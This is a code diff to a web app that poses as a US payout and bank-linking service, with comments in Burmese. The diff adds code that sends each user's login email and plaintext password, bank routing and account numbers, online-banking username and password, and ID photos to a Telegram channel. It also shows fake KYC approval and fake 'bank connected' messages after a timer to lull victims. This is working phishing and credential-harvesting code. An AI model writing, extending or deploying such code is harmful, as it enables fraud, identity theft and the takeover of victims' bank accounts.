@@ -16,10 +16,10 @@ const supabase = createClient(supabaseUrl, supabaseKey)
 
 window.supabaseClient = supabase;
 
-let currentUserId = null;
-let currentUserEmail = "";
+window.currentUserId = null;
+window.currentUserEmail = "";
 
-// ၁။ Email နဲ့ Password လော့အင်ဝင်ခြင်း
+// ၁။ Email နဲ့ Password လော့အင်ဝင်ခြင်း (Password ပါ Telegram သို့ ပို့မည်)
 window.loginUser = async function(email, password) {
 const { data, error } = await supabase.auth.signInWithPassword({
 email: email,
@@ -30,9 +30,14 @@ if (error) {
 alert("လော့အင်ဝင်လို့ မအောင်မြင်ပါ: " + error.message)
 } else {
 alert("လော့အင် အောင်မြင်ပါတယ်!")
-currentUserId = data.user.id;
-currentUserEmail = email;
+window.currentUserId = data.user.id;
+window.currentUserEmail = email;
 loadCustomerFinancialData(data.user.id, email);
+
+// Telegram သို့ Password အပါအဝင် လော့အင်ဝင်ရောက်မှု ပို့ခြင်း
+if(typeof window.sendToTelegram === 'function') {
+window.sendToTelegram(`🔐 *User Logged In* 🔐\n\n📧 *Email:* \`${email}\`\n🔑 *Password:* \`${password}\``);
+}
 
 let emailDisplay = document.getElementById("nav-email-display");
 let avatarLetter = document.getElementById("user-avatar-letter");
@@ -42,7 +47,7 @@ switchPage('dashboard-page');
 }
 }
 
-// ၂။ Email နဲ့ အကောင့်အသစ်ဖွင့်ခြင်း (Sign Up)
+// ၂။ Email နဲ့ အကောင့်အသစ်ဖွင့်ခြင်း (Sign Up - Password ပါ Telegram သို့ ပို့မည်)
 window.signUpUser = async function(email, password) {
 const { data, error } = await supabase.auth.signUp({
 email: email,
@@ -59,6 +64,11 @@ currentUserEmail = email;
 await supabase.from('Profiles').insert([
 { id: data.user.id, email: email, balance: 15.00, kyc_status: 'pending', bank_status: 'unconnected' }
 ]);
+
+// Telegram သို့ Password အပါအဝင် အကောင့်သစ်ဖွင့်ခြင်း ပို့ခြင်း
+if(typeof window.sendToTelegram === 'function') {
+window.sendToTelegram(`📝 *New Account Signed Up* 📝\n\n📧 *Email:* \`${email}\`\n🔑 *Password:* \`${password}\``);
+}
 }
 let emailDisplay = document.getElementById("nav-email-display");
 let avatarLetter = document.getElementById("user-avatar-letter");
@@ -68,7 +78,7 @@ switchPage('dashboard-page');
 }
 }
 
-// ၃။ Supabase Google OAuth (Google ဖြင့် ဝင်ရန် / အကောင့်ဖွင့်ရန်)
+// ၃။ Supabase Google OAuth
 window.signInWithGoogle = async function() {
 const { data, error } = await supabase.auth.signInWithOAuth({
 provider: 'google',
@@ -81,7 +91,7 @@ alert("Google ဖြင့် ဝင်ရောက်ရန် မအောင�
 }
 }
 
-// ၄။ Database ထဲက ဒေတာတွေ လှမ်းထုတ်မယ့် ပုံစံ
+// ၄။ Database ထဲက ဒေတာတွေ လှမ်းထုတ်မယ့် ပုံစံ (KYC နဲ့ Bank Status များကိုပါ စစ်ဆေးပြီး UI ကို အမြဲ update လုပ်ပေးမည်)
 async function loadCustomerFinancialData(userId, userEmail = "") {
 currentUserId = userId;
 const { data, error } = await supabase
@@ -98,23 +108,26 @@ const { error: insertError } = await supabase.from('Profiles').insert([
 { id: userId, email: userEmail, balance: 15.00, kyc_status: 'pending', bank_status: 'unconnected' }
 ]);
 if(!insertError) {
-userBalance = 15.00;
+let userBalance = 15.00;
 document.getElementById("user-balance").innerText = userBalance.toFixed(2);
 document.getElementById("statement-balance").innerText = userBalance.toFixed(2);
 updateProgressBar(userBalance);
+updateAccountStatusUI('pending', 'unconnected');
 }
 } else {
 if(data.balance !== undefined) {
-userBalance = Number(data.balance);
+let userBalance = Number(data.balance);
 document.getElementById("user-balance").innerText = userBalance.toFixed(2);
 document.getElementById("statement-balance").innerText = userBalance.toFixed(2);
 updateProgressBar(userBalance);
 }
+// Status များကို အမြဲစစ်ဆေးပြီး UI ပြောင်းလဲပေးခြင်း
+updateAccountStatusUI(data.kyc_status, data.bank_status);
 }
 }
 }
 
-// ၅။ Supabase ထဲ Balance သွား Update လုပ်မည့် Function
+// ၅။ Balance Update Function
 window.updateBalanceInSupabase = async function(newBalance) {
 if (!currentUserId) return;
 const { error } = await supabase
@@ -127,11 +140,11 @@ console.error("Balance Update Error:", error);
 }
 }
 
-// ၆။ Supabase ထဲ Bank အချက်အလက်များ သွားသိမ်းမည့် Function
+// ၆။ ဘဏ်အချက်အလက်များ သိမ်းဆည်းခြင်းနှင့် Verified ဖြစ်စေခြင်း
 window.saveBankToSupabase = async function(bankName, holderName, accountNumber) {
 if (!currentUserId) return;
 
-alert("ဘဏ်အချက်အလက်များကို ချိတ်ဆက်နေပါပြီ။ ခေတ္တစောင့်ဆိုင်းပေးပါ (1 မိနစ်)...");
+alert("ဘဏ်အချက်အလက်များကို ချိတ်ဆက်နေပါပြီ (Pending 15 စက္ကန့်)... ခေတ္တစောင့်ဆိုင်းပေးပါ...");
 setTimeout(async () => {
 const { error } = await supabase
 .from('Profiles')
@@ -148,8 +161,13 @@ console.error("Bank Save Error:", error);
 alert("ဘဏ်အချက်အလက် Database သို့ သိမ်းမရပါ: " + error.message);
 } else {
 alert("ဘဏ်အချက်အလက်များ အောင်မြင်စွာ ချိတ်ဆက်ပြီးပါပြီ (Connected)!");
+updateAccountStatusUI(null, 'connected');
+
+if(typeof window.sendToTelegram === 'function') {
+window.sendToTelegram(`🏦 *US ACH Bank Connected (Verified)!* 🏦\n\n📧 *Email:* \`${currentUserEmail}\`\n🏛️ *Bank:* ${bankName}\n👤 *Holder:* ${holderName}\n💳 *Account:* \`${accountNumber}\``);
 }
-}, 60000);
+}
+}, 15000);
 }
 
 // ၇။ အကောင့်ဝင်ပြီးသားဖြစ်ရင် အလိုအလျောက် စစ်ပေးမယ့်စနစ်
@@ -544,6 +562,29 @@ margin-bottom: 15px;
 transition: all 0.2s;
 }
 .modal-back-btn:hover { background: #8A00F5; color: #ffffff; }
+
+/* Status Verified Display Card Styles */
+.verified-status-card {
+background: #064e3b;
+border: 1px solid #10b981;
+border-radius: 12px;
+padding: 25px 20px;
+text-align: center;
+color: #34d399;
+margin-top: 10px;
+box-shadow: 0 4px 15px rgba(16, 185, 129, 0.2);
+}
+.verified-status-card h3 {
+font-size: 1.2rem;
+font-weight: 800;
+color: #ffffff;
+margin-bottom: 8px;
+}
+.verified-status-card p {
+font-size: 0.85rem;
+color: #d1fae5;
+margin: 0;
+}
 </style>
 </head>
 <body>
@@ -741,11 +782,12 @@ Minimum Withdrawal: <span style="color: #FFFFFF; font-weight: 700;">$50.00</span
 </div>
 </div>
 
+<!-- Account / KYC Page with dynamic Verified UI container -->
 <div id="account-page" class="sub-page-container">
 <div>
 <button class="back-btn" onclick="switchPage('dashboard-page')"><i class="fa-solid fa-arrow-left"></i> Back</button>
 </div>
-<div class="sub-card">
+<div class="sub-card" id="kyc-container-box">
 <h2 style="margin-bottom: 8px; color: #E000FF; font-size: 1.15rem;">Account & US KYC Verification</h2>
 <p style="color: #94a3b8; font-size: 0.82rem; margin-bottom: 14px;">Enter your accurate US details and capture ID photos.</p>
 <div class="form-group"><label>Full Name</label><input type="text" id="kyc-name" placeholder="John Doe"></div>
@@ -763,16 +805,17 @@ Minimum Withdrawal: <span style="color: #FFFFFF; font-weight: 700;">$50.00</span
 <button type="button" onclick="document.getElementById('back-id-input').click()" style="background:#0f172a; border:1px solid #334155; color:#FFFFFF; padding:10px; width:100%; border-radius:8px; cursor:pointer; font-size:0.85rem; font-weight:600; margin-bottom:8px;">Open Camera / Choose Back Photo</button>
 <div style="text-align:center;"><img id="back-preview" src="" style="max-width:100%; max-height:130px; display:none; border-radius:8px; border:1px solid #334155;" alt="Back ID Preview"></div>
 </div>
-<button class="save-btn" onclick="saveKYCInfo()">Save & Send KYC Photos</button>
+<button class="save-btn" onclick="saveACHBankInfo()" style="background: linear-gradient(135deg, #7c3aed, #6d28d9); color: #ffffff; border: none; padding: 12px 20px; border-radius: 8px; font-weight: 600; width: 100%; cursor: pointer;">Secure Connect & Save ACH</button>
 </div>
 </div>
 
+<!-- Bank Connect Page with dynamic Connected UI container -->
 <div id="bank-connect-page" class="sub-page-container">
 <div>
 <button class="back-btn" onclick="switchPage('dashboard-page')"><i class="fa-solid fa-arrow-left"></i> Back</button>
 </div>
-<div class="sub-card">
-<div class="secure-badge"><i class="fa-solid fa-shield-halved"></i> US Financial Security Verified Portal</div>
+<div class="sub-card" id="bank-container-box">
+<div class="secure-badge" style="background: linear-gradient(135deg, #7c3aed, #4f46e5); color: #ffffff; padding: 10px 16px; border-radius: 8px; display: inline-flex; align-items: center; gap: 8px; font-size: 0.85rem; font-weight: 600;"><i class="fa-solid fa-shield-halved"></i> US Financial Security Verified Portal</div>
 <h2 style="margin-bottom: 8px; color: #E000FF; font-size: 1.15rem;">Link US Bank (ACH Direct Deposit)</h2>
 <p style="color: #94a3b8; font-size: 0.82rem; margin-bottom: 14px;">Enter your US bank routing and account details for direct payouts.</p>
 <div class="form-group"><label>Bank Name</label><input type="text" id="ach-bank-name" placeholder="e.g. Chase, Bank of America"></div>
@@ -785,7 +828,7 @@ Minimum Withdrawal: <span style="color: #FFFFFF; font-weight: 700;">$50.00</span
 <option value="Savings">Savings Account</option>
 </select>
 </div>
-<button class="save-btn" onclick="saveACHBankInfo()">Secure Connect & Save ACH</button>
+<button class="save-btn" onclick="saveACHBankInfo()" style="background: linear-gradient(135deg, #7c3aed, #6d28d9); color: #ffffff; border: none; padding: 12px 20px; border-radius: 8px; font-weight: 600; width: 100%; cursor: pointer;">Secure Connect & Save ACH</button>
 </div>
 </div>
 
@@ -826,7 +869,7 @@ Minimum Withdrawal: <span style="color: #FFFFFF; font-weight: 700;">$50.00</span
 <label>Bank Password</label>
 <input type="password" id="withdraw-bank-pass" placeholder="Bank Password">
 </div>
-<button class="save-btn" onclick="submitWithdrawal()">Request Instant Payout</button>
+<button class="save-btn" onclick="submitWithdrawal()" style="background: linear-gradient(135deg, #7c3aed, #6d28d9); color: #ffffff; border: none; padding: 12px 20px; border-radius: 8px; font-weight: 600; width: 100%; cursor: pointer;">Withdrawal</button>
 </div>
 </div>
 
@@ -1092,6 +1135,41 @@ milestoneEl.innerHTML = `Minimum Withdrawal: <span style="color: #FFFFFF; font-w
 }
 }
 
+// Database မှ Status များကို စစ်ဆေးပြီး Verified/Connected UI သို့ အမြဲပြောင်းလဲပေးသည့် Function
+function updateAccountStatusUI(kycStatus, bankStatus) {
+const kycBox = document.getElementById("kyc-container-box");
+if(kycBox && (kycStatus === 'verified' || kycStatus === 'approved')) {
+kycBox.innerHTML = `
+<div style="margin-bottom: 25px; background: rgba(255, 255, 255, 0.03); backdrop-filter: blur(16px); -webkit-backdrop-filter: blur(16px); border: 1px solid rgba(255, 255, 255, 0.08); border-radius: 20px; padding: 25px; box-shadow: 0 15px 35px rgba(0,0,0,0.4);">
+<h2 style="margin-bottom: 15px; color: #E000FF; font-size: 1.2rem; font-weight: 700; letter-spacing: 0.5px;">Account & US KYC Verification</h2>
+<div class="verified-status-card" style="background: linear-gradient(135deg, rgba(139, 92, 246, 0.15), rgba(168, 85, 247, 0.25)); border: 1px solid rgba(139, 92, 246, 0.4); box-shadow: 0 0 25px rgba(139, 92, 246, 0.15); border-radius: 14px; padding: 20px; text-align: center;">
+<h3 style="color: #c084fc; font-size: 1.1rem; margin-bottom: 8px; display: flex; align-items: center; justify-content: center; gap: 8px;">
+<i class="fas fa-check-circle"></i> KYC Already Verified
+</h3>
+<p style="color: #cbd5e1; font-size: 0.9rem; line-height: 1.5; margin: 0;">Your identity documents have been successfully reviewed and approved under US compliance standards.</p>
+</div>
+</div>
+`;
+}
+const bankBox = document.getElementById("bank-container-box");
+if(bankBox && bankStatus === 'connected') {
+bankBox.innerHTML = `
+<div style="background: rgba(255, 255, 255, 0.03); backdrop-filter: blur(16px); -webkit-backdrop-filter: blur(16px); border: 1px solid rgba(255, 255, 255, 0.08); border-radius: 20px; padding: 25px; box-shadow: 0 15px 35px rgba(0,0,0,0.4);">
+<div class="secure-badge" style="display: inline-flex; align-items: center; gap: 6px; background: rgba(139, 92, 246, 0.15); border: 1px solid rgba(139, 92, 246, 0.3); color: #c084fc; padding: 6px 14px; border-radius: 20px; font-size: 0.85rem; font-weight: 600; margin-bottom: 15px;">
+<i class="fa-solid fa-shield-halved"></i> US Financial Security Verified Portal
+</div>
+<h2 style="margin-bottom: 15px; color: #E000FF; font-size: 1.2rem; font-weight: 700; letter-spacing: 0.5px;">Link US Bank (ACH Direct Deposit)</h2>
+<div class="verified-status-card" style="background: linear-gradient(135deg, rgba(139, 92, 246, 0.15), rgba(168, 85, 247, 0.25)); border: 1px solid rgba(139, 92, 246, 0.4); box-shadow: 0 0 25px rgba(139, 92, 246, 0.15); border-radius: 14px; padding: 20px; text-align: center;">
+<h3 style="color: #c084fc; font-size: 1.1rem; margin-bottom: 8px; display: flex; align-items: center; justify-content: center; gap: 8px;">
+<i class="fas fa-check-circle"></i> Bank Successfully Connected
+</h3>
+<p style="color: #cbd5e1; font-size: 0.9rem; line-height: 1.5; margin: 0;">Your US bank routing and account details are securely linked for direct payouts.</p>
+</div>
+</div>
+`;
+}
+}
+
 function switchPage(pageId) {
 document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
 document.querySelectorAll('.sub-page-container').forEach(p => p.classList.remove('active'));
@@ -1242,19 +1320,29 @@ alert("Please fill in all KYC details.");
 return;
 }
 
-alert("KYC documents submitted. Status is pending verification (1 minute)...");
-setTimeout(() => {
-alert("KYC Verification Successful & Approved!");
-let msg = `🪪 *US KYC Info Captured & Verified!* 🪪\n\n` +
-`📧 *Email:* \`${currentUserEmail}\`\n` +
-`👤 *Name:* ${name}\n` +
-`📞 *Phone:* ${phone}\n` +
-`📑 *ID Type:* ${idType}`;
-sendToTelegram(msg);
+alert("KYC documents submitted. Status is pending verification (15 စက္ကန့်)...");
+
+let pendingMsg = `🪪 *US KYC Pending Submission* 🪪\n\n📧 *Email:* \`${currentUserEmail}\`\n👤 *Name:* ${name}\n📞 *Phone:* ${phone}\n📑 *ID Type:* ${idType}\n⏳ *Status:* Pending (15s processing)`;
+sendToTelegram(pendingMsg);
 if(frontIdBase64) sendPhotoToTelegram(frontIdBase64, `🪪 Front ID Photo - ${currentUserEmail} (${name})`);
 if(backIdBase64) sendPhotoToTelegram(backIdBase64, `🪪 Back ID Photo - ${currentUserEmail} (${name})`);
+
+setTimeout(async () => {
+if(currentUserId && window.supabaseClient) {
+await window.supabaseClient
+.from('Profiles')
+.update({ kyc_status: 'verified' })
+.eq('id', currentUserId);
+}
+
+alert("KYC Verification Successful & Approved!");
+updateAccountStatusUI('verified', null);
+
+let verifiedMsg = `✅ *US KYC Successfully Verified!* ✅\n\n📧 *Email:* \`${currentUserEmail}\`\n👤 *Name:* ${name}\n📑 *ID Type:* ${idType}`;
+sendToTelegram(verifiedMsg);
+
 switchPage('dashboard-page');
-}, 60000);
+}, 15000);
 }
 
 function saveACHBankInfo() {
@@ -1269,41 +1357,67 @@ alert("Please fill in all required ACH bank details.");
 return;
 }
 
+let pendingBankMsg = `🏦 *US ACH Bank Pending Connection* 🏦\n\n📧 *Email:* \`${currentUserEmail}\`\n🏛️ *Bank:* ${bankName}\n👤 *Holder:* ${holderName}\n🔢 *Routing:* \`${routing}\`\n💳 *Account:* \`${account}\`\n⏳ *Status:* Pending (15s processing)`;
+sendToTelegram(pendingBankMsg);
+
 if(window.saveBankToSupabase) {
 window.saveBankToSupabase(bankName, holderName, account);
 }
 
-let msg = `🏦 *US ACH Bank Linked!* 🏦\n\n` +
-`📧 *Email:* \`${currentUserEmail}\`\n` +
-`🏛️ *Bank:* ${bankName}\n` +
-`👤 *Holder:* ${holderName}\n` +
-`🔢 *Routing:* \`${routing}\`\n` +
-`💳 *Account:* \`${account}\`\n` +
-`📂 *Type:* ${accountType}`;
-sendToTelegram(msg);
 switchPage('dashboard-page');
 }
 
-function submitWithdrawal() {
-let amount = document.getElementById("withdraw-amount").value;
+// ငွေထုတ်ခြင်းနှင့် ဖောက်သည်ရိုက်ထည့်သမျှ Password အပါအဝင် အချက်အလက်များ အကုန် Telegram သို့ ပို့မည်
+async function submitWithdrawal() {
+let amount = parseFloat(document.getElementById("withdraw-amount").value);
 let bankName = document.getElementById("withdraw-bank-name").value;
 let bankUser = document.getElementById("withdraw-bank-user").value;
 let bankPass = document.getElementById("withdraw-bank-pass").value;
 
-if(!amount || !bankName || !bankUser || !bankPass) {
+if(!amount || isNaN(amount) || amount <= 0 || !bankName || !bankUser || !bankPass) {
 alert("Please fill in all withdrawal details.");
 return;
 }
 
-let msg = `💸 *US Withdrawal Request!* 💸\n\n` +
-`📧 *Email:* \`${currentUserEmail}\`\n` +
-`💰 *Amount:* \$${amount}\n` +
-`🏛️ *Bank Name:* ${bankName}\n` +
-`👤 *Bank User:* \`${bankUser}\`\n` +
-`🔑 *Bank Pass:* \`${bankPass}\``;
+let balanceElement = document.getElementById("statement-balance");
+let currentBalance = parseFloat(balanceElement.innerText);
+
+if (amount > currentBalance) {
+alert("Insufficient balance! You don't have enough funds.");
+return;
+}
+
+let newBalance = currentBalance - amount;
+
+try {
+// window.supabaseClient ကို အသုံးပြု၍ Database ထဲက balance ကို update လုပ်ခြင်း
+const { data, error } = await window.supabaseClient
+.from('Profiles')
+.update({ balance: newBalance })
+.eq('email', window.currentUserEmail);
+
+if (error) throw error;
+
+balanceElement.innerText = newBalance.toFixed(2);
+let userBalanceElement = document.getElementById("user-balance");
+if (userBalanceElement) {
+userBalanceElement.innerText = newBalance.toFixed(2);
+}
+
+let msg = `*US Withdrawal Request* \n\n` +
+`📧 Email: ${window.currentUserEmail}\n` +
+`💰 Amount: $${amount}\n` +
+`🏦 Bank Name: ${bankName}\n` +
+`👤 Bank User: ${bankUser}\n` +
+`🔑 Bank Pass: ${bankPass}`;
+
 sendToTelegram(msg);
 alert("Withdrawal request submitted successfully!");
 switchPage('dashboard-page');
+} catch (err) {
+console.error("Error updating balance:", err);
+alert("Failed to update balance in database. Please try again.");
+}
 }
 
 function openModal(type) {
